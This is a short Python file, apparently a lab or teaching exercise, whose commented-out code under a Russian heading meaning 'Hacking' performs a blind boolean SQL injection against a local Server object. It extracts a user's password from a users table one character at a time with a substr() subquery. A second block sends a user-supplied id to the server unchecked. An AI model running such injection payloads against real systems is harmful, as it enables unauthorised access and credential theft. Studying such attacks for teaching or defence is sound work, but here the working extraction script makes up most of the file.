from server import Server

# --------------------------------------------------------------------------------------------
# Взлом
# server = Server()
# alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_-"
# password = ''
# for i in range(1,10):
#     for char in alphabet:
#         query = f"5 AND (SELECT substr(password, {i}, 1) FROM users WHERE id = 5) = '{char}'"
#         if server.request(query):
#             password += char
#             break
#     print(password)

# server.close()
# --------------------------------------------------------------------------------------------
# Начало проверки по id
# server = Server()

# _id =  input("Enter id: ")

# response = server.request(_id)
# if response:
#     print('success')
# else:
#     print("failure")

# server.close()